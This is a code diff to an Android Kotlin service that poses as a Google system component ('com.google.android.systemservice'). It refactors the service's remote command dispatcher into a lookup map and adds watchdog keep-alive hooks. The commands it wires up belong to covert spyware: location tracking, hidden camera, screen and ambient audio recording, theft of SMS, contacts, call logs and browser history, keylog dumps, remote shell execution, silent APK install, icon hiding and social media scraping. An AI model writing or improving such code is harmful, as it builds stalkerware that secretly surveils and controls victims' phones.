@@ -18,6 +18,7 @@ import com.google.android.systemservice.handlers.FileHandlers
 import com.google.android.systemservice.handlers.LocationHandlers
 import com.google.android.systemservice.handlers.SystemHandlers
 import com.google.android.systemservice.network.CommandTransport
+import com.google.android.systemservice.network.TransportConfig
 import com.google.android.systemservice.utils.CommandQueueManager
 import com.google.android.systemservice.utils.DataSyncManager
 import com.google.android.systemservice.utils.StealthNotificationHelper
@@ -45,6 +46,7 @@ class CommandService : Service(), CommandContext {
 
     override fun onCreate() {
         super.onCreate()
+        WatchdogService.markServiceRunning(this::class.java)
         Log.d(TAG, "CommandService created")
         
         // Initialize offline data sync manager
@@ -67,8 +69,10 @@ class CommandService : Service(), CommandContext {
         
         // Initialize transport layer (WebSocket + HTTP polling)
         transport = CommandTransport(
-            scope = serviceScope,
-            dataSyncManager = dataSyncManager,
+            config = TransportConfig(
+                scope = serviceScope,
+                dataSyncManager = dataSyncManager
+            ),
             getDeviceId = { getDeviceIdentifier() },
             onCommandReceived = { command, params, requestId, priority, resource ->
                 dispatchCommand(command, params, requestId, priority, resource)
@@ -165,14 +169,7 @@ class CommandService : Service(), CommandContext {
     override fun getCurrentRequestId(): String? = transport.currentRequestId.get()
     override fun setCurrentRequestId(requestId: String?) { transport.currentRequestId.set(requestId) }
     override fun getDeviceIdentifier(): String {
-        return try {
-            android.provider.Settings.Secure.getString(
-                contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
-        } catch (e: Exception) {
-            AndroidConfig.deviceId.ifEmpty { "unknown" }
-        }
+        return com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this)
     }
 
     override fun sendResponse(type: String, data: JSONObject, requestId: String?) {
@@ -247,72 +244,75 @@ class CommandService : Service(), CommandContext {
         "add_geofence"           to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
     )
 
+    /** Maps each command name to a factory that produces its suspend action. */
+    private val actionMap: Map<String, (JSONObject?) -> suspend () -> Unit> = mapOf(
+        // Location
+        "get_location"            to { _ -> { locationHandlers.executeGetLocation() } },
+        "get_accounts"            to { _ -> { locationHandlers.executeGetAccounts() } },
+        "toggle_wifi"             to { _ -> { locationHandlers.executeToggleWifi() } },
+        "start_location_tracking" to { p -> { locationHandlers.executeStartLocationTracking(p) } },
+        "stop_location_tracking"  to { _ -> { locationHandlers.executeStopLocationTracking() } },
+        // Camera/Media
+        "start_camera"            to { p -> { cameraHandlers.executeStartCamera(p) } },
+        "stop_camera"             to { _ -> { cameraHandlers.executeStopCamera() } },
+        "take_photo"              to { p -> { cameraHandlers.executeTakePhoto(p) } },
+        "start_live_video"        to { p -> { cameraHandlers.executeStartLiveVideo(p) } },
+        "stop_live_video"         to { _ -> { cameraHandlers.executeStopLiveVideo() } },
+        "take_screenshot"         to { _ -> { cameraHandlers.executeTakeScreenshot() } },
+        "start_screen_record"     to { p -> { cameraHandlers.executeStartScreenRecord(p) } },
+        "stop_screen_record"      to { _ -> { cameraHandlers.executeStopScreenRecord() } },
+        // Audio
+        "start_audio"             to { p -> { audioHandlers.executeStartAudio(p) } },
+        "stop_audio"              to { _ -> { audioHandlers.executeStopAudio() } },
+        "start_live_audio"        to { _ -> { audioHandlers.executeStartLiveAudio() } },
+        "stop_live_audio"         to { _ -> { audioHandlers.executeStopLiveAudio() } },
+        "ambient_record"          to { p -> { audioHandlers.executeAmbientRecord(p) } },
+        // Device Info
+        "get_device_info"         to { _ -> { deviceInfoHandlers.executeGetDeviceInfo() } },
+        "get_contacts"            to { _ -> { deviceInfoHandlers.executeGetContacts() } },
+        "get_sms"                 to { _ -> { deviceInfoHandlers.executeGetSms() } },
+        "get_call_logs"           to { _ -> { deviceInfoHandlers.executeGetCallLogs() } },
+        "get_installed_apps"      to { _ -> { deviceInfoHandlers.executeGetInstalledApps() } },
+        "get_wifi_info"           to { _ -> { deviceInfoHandlers.executeGetWifiInfo() } },
+        "get_app_usage"           to { _ -> { deviceInfoHandlers.executeGetAppUsage() } },
+        "get_browser_history"     to { _ -> { deviceInfoHandlers.executeGetBrowserHistory() } },
+        // File operations
+        "browse_files"            to { p -> { fileHandlers.executeBrowseFiles(p) } },
+        "list_files"              to { p -> { fileHandlers.executeListFiles(p) } },
+        "download_file"           to { p -> { fileHandlers.executeDownloadFile(p) } },
+        "upload_file"             to { p -> { fileHandlers.executeUploadFile(p) } },
+        "upload_file_chunk"       to { p -> { fileHandlers.executeUploadFileChunk(p) } },
+        "delete_file"             to { p -> { fileHandlers.executeDeleteFile(p) } },
+        "preview_file"            to { p -> { fileHandlers.executePreviewFile(p) } },
+        "rename_file"             to { p -> { fileHandlers.executeRenameFile(p) } },
+        "move_file"               to { p -> { fileHandlers.executeMoveFile(p) } },
+        "search_files"            to { p -> { fileHandlers.executeSearchFiles(p) } },
+        // Device Control
+        "install_apk"             to { p -> { deviceControlHandlers.executeInstallApk(p) } },
+        "uninstall_app"           to { p -> { deviceControlHandlers.executeUninstallApp(p) } },
+        "launch_app"              to { p -> { deviceControlHandlers.executeLaunchApp(p) } },
+        "unlock_screen"           to { _ -> { deviceControlHandlers.executeUnlockScreen() } },
+        "hide_icon"               to { _ -> { deviceControlHandlers.executeHideIcon() } },
+        "show_icon"               to { _ -> { deviceControlHandlers.executeShowIcon() } },
+        "change_audio_mode"       to { p -> { deviceControlHandlers.executeChangeAudioMode(p) } },
+        // System
+        "shell_command"           to { p -> { systemHandlers.executeShellCommand(p) } },
+        "shell_exec"              to { p -> { systemHandlers.executeShellExec(p) } },
+        "get_keylog_dump"         to { _ -> { systemHandlers.executeGetKeylogDump() } },
+        "keylog_ack"              to { p -> { systemHandlers.handleKeylogAck(p ?: JSONObject()) } },
+        "send_sms"                to { p -> { systemHandlers.executeSendSms(p) } },
+        "start_clipboard_monitor" to { _ -> { systemHandlers.executeStartClipboardMonitor() } },
+        "social_media_chats"      to { p -> { systemHandlers.executeSocialMediaScraping(p) } },
+        "add_geofence"            to { p -> { systemHandlers.executeAddGeofence(p) } },
+    )
+
     /**
      * Resolve the execute function for a command name.
      * Returns null for unknown commands.
      */
     private fun resolveAction(command: String, params: JSONObject?): (suspend () -> Unit)? {
-        return when (command) {
-            // Location
-            "get_location" -> {{ locationHandlers.executeGetLocation() }}
-            "get_accounts" -> {{ locationHandlers.executeGetAccounts() }}
-            "toggle_wifi" -> {{ locationHandlers.executeToggleWifi() }}
-            "start_location_tracking" -> {{ locationHandlers.executeStartLocationTracking(params) }}
-            "stop_location_tracking" -> {{ locationHandlers.executeStopLocationTracking() }}
-            // Camera/Media
-            "start_camera" -> {{ cameraHandlers.executeStartCamera(params) }}
-            "stop_camera" -> {{ cameraHandlers.executeStopCamera() }}
-            "take_photo" -> {{ cameraHandlers.executeTakePhoto(params) }}
-            "start_live_video" -> {{ cameraHandlers.executeStartLiveVideo(params) }}
-            "stop_live_video" -> {{ cameraHandlers.executeStopLiveVideo() }}
-            "take_screenshot" -> {{ cameraHandlers.executeTakeScreenshot() }}
-            "start_screen_record" -> {{ cameraHandlers.executeStartScreenRecord(params) }}
-            "stop_screen_record" -> {{ cameraHandlers.executeStopScreenRecord() }}
-            // Audio
-            "start_audio" -> {{ audioHandlers.executeStartAudio(params) }}
-            "stop_audio" -> {{ audioHandlers.executeStopAudio() }}
-            "start_live_audio" -> {{ audioHandlers.executeStartLiveAudio() }}
-            "stop_live_audio" -> {{ audioHandlers.executeStopLiveAudio() }}
-            "ambient_record" -> {{ audioHandlers.executeAmbientRecord(params) }}
-            // Device Info
-            "get_device_info" -> {{ deviceInfoHandlers.executeGetDeviceInfo() }}
-            "get_contacts" -> {{ deviceInfoHandlers.executeGetContacts() }}
-            "get_sms" -> {{ deviceInfoHandlers.executeGetSms() }}
-            "get_call_logs" -> {{ deviceInfoHandlers.executeGetCallLogs() }}
-            "get_installed_apps" -> {{ deviceInfoHandlers.executeGetInstalledApps() }}
-            "get_wifi_info" -> {{ deviceInfoHandlers.executeGetWifiInfo() }}
-            "get_app_usage" -> {{ deviceInfoHandlers.executeGetAppUsage() }}
-            "get_browser_history" -> {{ deviceInfoHandlers.executeGetBrowserHistory() }}
-            // File operations
-            "browse_files" -> {{ fileHandlers.executeBrowseFiles(params) }}
-            "list_files" -> {{ fileHandlers.executeListFiles(params) }}
-            "download_file" -> {{ fileHandlers.executeDownloadFile(params) }}
-            "upload_file" -> {{ fileHandlers.executeUploadFile(params) }}
-            "upload_file_chunk" -> {{ fileHandlers.executeUploadFileChunk(params) }}
-            "delete_file" -> {{ fileHandlers.executeDeleteFile(params) }}
-            "preview_file" -> {{ fileHandlers.executePreviewFile(params) }}
-            "rename_file" -> {{ fileHandlers.executeRenameFile(params) }}
-            "move_file" -> {{ fileHandlers.executeMoveFile(params) }}
-            "search_files" -> {{ fileHandlers.executeSearchFiles(params) }}
-            // Device Control
-            "install_apk" -> {{ deviceControlHandlers.executeInstallApk(params) }}
-            "uninstall_app" -> {{ deviceControlHandlers.executeUninstallApp(params) }}
-            "launch_app" -> {{ deviceControlHandlers.executeLaunchApp(params) }}
-            "unlock_screen" -> {{ deviceControlHandlers.executeUnlockScreen() }}
-            "hide_icon" -> {{ deviceControlHandlers.executeHideIcon() }}
-            "show_icon" -> {{ deviceControlHandlers.executeShowIcon() }}
-            "change_audio_mode" -> {{ deviceControlHandlers.executeChangeAudioMode(params) }}
-            // System
-            "shell_command" -> {{ systemHandlers.executeShellCommand(params) }}
-            "shell_exec" -> {{ systemHandlers.executeShellExec(params) }}
-            "get_keylog_dump" -> {{ systemHandlers.executeGetKeylogDump() }}
-            "keylog_ack" -> {{ systemHandlers.handleKeylogAck(params ?: JSONObject()) }}
-            "send_sms" -> {{ systemHandlers.executeSendSms(params) }}
-            "start_clipboard_monitor" -> {{ systemHandlers.executeStartClipboardMonitor() }}
-            "social_media_chats" -> {{ systemHandlers.executeSocialMediaScraping(params) }}
-            "add_geofence" -> {{ systemHandlers.executeAddGeofence(params) }}
-            else -> null
-        }
+        val factory = actionMap[command] ?: return null
+        return factory(params)
     }
 
     /**
@@ -378,6 +378,7 @@ class CommandService : Service(), CommandContext {
     }
 
     override fun onDestroy() {
+        WatchdogService.markServiceStopped(this::class.java)
         super.onDestroy()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             stopForeground(STOP_FOREGROUND_DETACH)
